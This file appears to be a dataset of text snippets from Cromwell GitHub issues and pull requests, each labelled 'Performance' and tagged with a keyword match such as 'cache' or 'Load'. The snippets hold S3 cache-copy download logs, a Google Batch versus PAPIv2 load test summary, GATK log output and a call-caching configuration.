s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-70/cacheCopy/SR00c.HG02855.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf01",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:5050,cache,cacheCopy,5050,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-92/cacheCopy/SR00c.HG03744.txt.gz; 1608597345651,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-144/cacheCopy/SR00c.NA20346.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-144/cacheCopy/SR00c.NA20346.txt.gz.tbi; 1608597348432,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-120/cacheCopy/SR00c.NA18956.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-120/cacheCopy/SR00c.NA18956.txt.gz; 1608597351053,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-124/cacheCopy/SR00c.NA19062.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:111017,cache,cacheCopy,111017,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-96/cacheCopy/SR00c.HG03864.txt.gz; 1608597453442,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-138/cacheCopy/SR00c.NA19795.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-138/cacheCopy/SR00c.NA19795.txt.gz.tbi; 1608597455771,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-112/cacheCopy/SR00c.NA18539.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-112/cacheCopy/SR00c.NA18539.txt.gz; 1608597458007,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-3/cacheCopy/SR00c.HG00140.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf01",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:141604,cache,cacheCopy,141604,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-82e9-4d95-8fc0-04dfbbd746da.; taskExecution.exitCode=0. Event type=STATUS_CHANGED; time=seconds: 1712173989, nanos: 937816549; taskState=STATE_UNSPECIFIED; description=Job state is set from RUNNING to SUCCEEDED for job projects/392615380452/locations/us-south1/jobs/job-ba81bad8-82e9-4d95-8fc0-04dfbbd746da.; taskExecution.exitCode=0; ```. What we define as execution events:. ```; ExecutionEvent(Job state is set from QUEUED to SCHEDULED for job projects/392615380452/locations/us-south1/jobs/job-321db1bc-9a68-4171-aa2a-46885d781656.,2024-04-03T20:10:01.704137839Z,None); ExecutionEvent(Job state is set from SCHEDULED to RUNNING for job projects/392615380452/locations/us-south1/jobs/job-321db1bc-9a68-4171-aa2a-46885d781656.,2024-04-03T20:11:30.631264449Z,None); ExecutionEvent(Job state is set from RUNNING to SUCCEEDED for job projects/392615380452/locations/us-south1/jobs/job-321db1bc-9a68-4171-aa2a-46885d781656.,2024-04-03T20:12:16.898798407Z,None); ```. </details>; </details>. ## Load test results. We have executed many load tests, this is the latest one involving 14k jobs. Data / Backend | Batch with Mysql | PAPIv2 with Mysql; ------------- | -------------|---------; Jobs | 14400 | 14400; Execution time | 20936 seconds | 24451 seconds. Overall, all our tests indicate that Batch finishes executing the jobs faster than PAPIv2. <details>; <summary>Load tests settings</summary>. We have ran Cromwell in server mode with the following settings:. - request-timeout: 10m; - idle-timeout: 10m; - job-rate-control: jobs = 20, per = 10 seconds; - max-workflow-launch-count: 50; - new-workflow-poll-rate: 1; - database: MySQL; - virtual-private-cloud setup; - maximum-polling-interval: 600s; - localization-attempts: 3; - google.auth: service account; - request-workers: 3; - concurrent-job-limit: 14400. JVM Options:; - `-Xms512m -Xmx64g`. **NOTE**: Initially we found a bottleneck on Batch but Google enabled an experimental settings to schedule many jobs concurrently which reduced the ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7412:5354,Load,Load,5354,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412,1,['Load'],['Load']
Performance,"-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-115/cacheCopy/SR00c.NA18560.txt.gz.tbi; 1608597046875,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-156/cacheCopy/SR00c.NA21133.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-156/cacheCopy/SR00c.NA21133.txt.gz.tbi; 1608597049133,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-127/cacheCopy/SR00c.NA19184.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-127/cacheCopy/SR00c.NA19184.txt.gz; 1608597051239,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-151/cacheCopy/SR00c.NA20845.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:30001,cache,cacheCopy,30001,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-125/cacheCopy/SR00c.NA19102.txt.gz.tbi; 1608597533973,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-134/cacheCopy/SR00c.NA19678.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-134/cacheCopy/SR00c.NA19678.txt.gz.tbi; 1608597536250,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-76/cacheCopy/SR00c.HG03100.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-76/cacheCopy/SR00c.HG03100.txt.gz.tbi; 1608597538865,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-152/cacheCopy/SR00c.NA20869.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:166147,cache,cacheCopy,166147,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-129/cacheCopy/SR00c.NA19351.txt.gz.tbi; 1608597005866,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-130/cacheCopy/SR00c.NA19377.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-130/cacheCopy/SR00c.NA19377.txt.gz.tbi; 1608597008325,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-119/cacheCopy/SR00c.NA18945.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-119/cacheCopy/SR00c.NA18945.txt.gz; 1608597012199,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-153/cacheCopy/SR00c.NA20895.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:19408,cache,cacheCopy,19408,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-133/cacheCopy/SR00c.NA19661.txt.gz.tbi; 1608597487788,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-150/cacheCopy/SR00c.NA20802.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-150/cacheCopy/SR00c.NA20802.txt.gz.tbi; 1608597489587,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-55/cacheCopy/SR00c.HG02275.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-55/cacheCopy/SR00c.HG02275.txt.gz.tbi; 1608597491461,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-29/cacheCopy/SR00c.HG01396.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:152178,cache,cacheCopy,152178,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-146/cacheCopy/SR00c.NA20510.txt.gz.tbi; 1608597219467,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-124/cacheCopy/SR00c.NA19062.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-124/cacheCopy/SR00c.NA19062.txt.gz.tbi; 1608597222742,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-86/cacheCopy/SR00c.HG03649.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-86/cacheCopy/SR00c.HG03649.txt.gz; 1608597227140,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-154/cacheCopy/SR00c.NA21102.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:77997,cache,cacheCopy,77997,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-152/cacheCopy/SR00c.NA20869.txt.gz.tbi; 1608597540849,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-121/cacheCopy/SR00c.NA18995.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-121/cacheCopy/SR00c.NA18995.txt.gz.tbi; 1608597542416,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-43/cacheCopy/SR00c.HG01958.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-43/cacheCopy/SR00c.HG01958.txt.gz.tbi; 1608597544559,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-9/cacheCopy/SR00c.HG00337.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:168032,cache,cacheCopy,168032,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-a5da-e3d0c4705a3e/call-HaplotypeCaller/shard-4/HaplotypeCaller-4-stdout.log"",; ""shardIndex"": 4,; ""stderr"": ""gs://cromwell_execution_bucket/280d07ef-7130-47b7-a5da-e3d0c4705a3e/call-HaplotypeCaller/shard-4/HaplotypeCaller-4-stderr.log"",; ""attempt"": 1,; ""backendLogs"": {; ""log"": ""gs://cromwell_execution_bucket/280d07ef-7130-47b7-a5da-e3d0c4705a3e/call-HaplotypeCaller/shard-4/HaplotypeCaller-4.log""; }; }```. ```tlangs at some_computer in /a/working/directory; $ gsutil cat gs://cromwell_execution_bucket/280d07ef-7130-47b7-a5da-e3d0c4705a3e/call-HaplotypeCaller/shard-4/HaplotypeCaller-4-stdout.log; CommandException: No URLs matched: gs://cromwell_execution_bucket/280d07ef-7130-47b7-a5da-e3d0c4705a3e/call-HaplotypeCaller/shard-4/HaplotypeCaller-4-stdout.log. tlangs at some_computer in /a/working/directory; $ gsutil cat gs://cromwell_execution_bucket/280d07ef-7130-47b7-a5da-e3d0c4705a3e/call-HaplotypeCaller/shard-4/attempt-2/HaplotypeCaller-4-stdout.log; 21:45:13.012 INFO NativeLibraryLoader - Loading libgkl_compression.so from jar:file:/usr/gitc/gatk4/gatk-package-4.beta.5-local.jar!/com/intel/gkl/native/libgkl_compression.so; 21:45:13.215 INFO PrintReads - HTSJDK Defaults.COMPRESSION_LEVEL : 1; 21:45:13.216 INFO PrintReads - HTSJDK Defaults.USE_ASYNC_IO_READ_FOR_SAMTOOLS : false; 21:45:13.216 INFO PrintReads - HTSJDK Defaults.USE_ASYNC_IO_WRITE_FOR_SAMTOOLS : true; 21:45:13.216 INFO PrintReads - HTSJDK Defaults.USE_ASYNC_IO_WRITE_FOR_TRIBBLE : false; 21:45:13.217 INFO PrintReads - Deflater: IntelDeflater; 21:45:13.217 INFO PrintReads - Inflater: IntelInflater; 21:45:13.218 INFO PrintReads - GCS max retries/reopens: 20; 21:45:13.218 INFO PrintReads - Using google-cloud-java patch c035098b5e62cb4fe9155eff07ce88449a361f5d from https://github.com/droazen/google-cloud-java/tree/dr_all_nio_fixes; 21:45:13.218 INFO PrintReads - Initializing engine; 21:45:16.218 INFO IntervalArgumentCollection - Processing 292450248 bp from intervals; 21:45:16.221 INFO PrintReads - Done initiali",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3929:1095,Load,Loading,1095,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3929,1,['Load'],['Loading']
Performance,"-akka.dispatchers.engine-dispatcher-27 WARN - BackendPreparationActor_for_bcfd9d26:UnmappedBamToAlignedBam.SamToFastqAndBwaMemAndMba:14:1 [UUID(bcfd9d26)]: Docker lookup failed; cala:35); ```. How do I set it up to enable caching calls?. ------------------------------------------------------------------------------------------; running file; ```; java -jar -Ddocker.hash-lookup.method=local -Ddocker.hash-lookup.enabled=true -Dwebservice.port=8088 -Dwebservice.interface=0.0.0.0 -Dconfig.file=/work/share/ac7m4df1o5/bin/cromwell/3_config/cromwellslurmsingularitynew.conf ./cromwell-84.jar server. ```; config ; ```; # This line is required. It pulls in default overrides from the embedded cromwell; # `reference.conf` (in core/src/main/resources) needed for proper performance of cromwell.; include required(classpath(""application"")). # Cromwell HTTP server settings; webservice {; #port = 8000; #interface = 0.0.0.0; #binding-timeout = 5s; #instance.name = ""reference""; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }. # Cromwell ""system"" settings; system {; # If 'true', a SIGINT will trigger Cromwell to attempt to abort all currently running jobs before exiting; #abort-jobs-on-terminate = false. # this tells Cromwell to retry the task with Nx memory when it sees either OutOfMemoryError or Killed in the stderr file.; memory-retry-error-keys = [""OutOfMemory"", ""Out Of Memory"",""Out of memory""]; # If 'true', a SIGTERM or SIGINT will trigger Cromwell to attempt to gracefully shutdown in server mode,; # in particular clearing up all queued database writes before letting the JVM shut down.; # The shutdown is a multi-phase process, each phase having its own configurable timeout. See the Dev Wiki for more details.; #graceful-server-shutdown = true. # Cromwell will cap the number of running workflows at N; #max-concurrent-workflows = 5000. # Cromwell will launch up to N submitted workflows at a time, regardless of how many open workflow slots exist; #max-workflow",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:1228,cache,cache-results,1228,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['cache'],['cache-results']
